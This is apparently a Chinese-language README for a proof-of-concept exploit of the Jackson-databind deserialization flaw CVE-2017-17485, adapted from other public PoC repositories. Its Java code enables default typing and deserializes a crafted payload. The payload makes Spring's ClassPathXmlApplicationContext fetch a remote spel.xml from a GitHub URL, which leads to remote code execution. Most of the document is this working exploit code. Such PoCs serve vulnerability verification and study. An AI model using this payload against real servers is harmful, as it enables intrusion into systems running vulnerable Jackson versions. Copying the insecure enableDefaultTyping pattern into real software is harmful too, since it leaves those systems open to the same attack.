# Jackson 反序列化

本war包基于廖师傅 https://github.com/shengqi158/Jackson-databind-RCE-PoC 的改造

基友的hucheat https://github.com/hucheat/vulns/tree/master/cve-2017-17485_web_vuln

## 验证代码

```
package jackson;

import java.io.IOException;

import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * Jackson CVE-2017-17485
 * 2018-01-22
 * @author Bearcat
 *
 */
public class poc {
	
	public static void payload() {
		// CVE-2017-17485
		//["org.springframework.context.support.ClassPathXmlApplicationContext", "http://127.0.0.1/spel.xml"]
		String payload = "[\"org.springframework.context.support.ClassPathXmlApplicationContext\", " +
	                "\"https://raw.githubusercontent.com/iBearcat/Jackson-CVE-2017-17485/master/spel.xml\"]\n";
		System.out.println(payload);
		ObjectMapper mapper = new ObjectMapper();
		mapper.enableDefaultTyping();
		try {
			mapper.readValue(payload, Object.class);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public static void main(String args[]) {
		payload();
	}
}

```

![payload](https://raw.githubusercontent.com/iBearcat/Jackson-CVE-2017-17485/master/img/1.jpg)
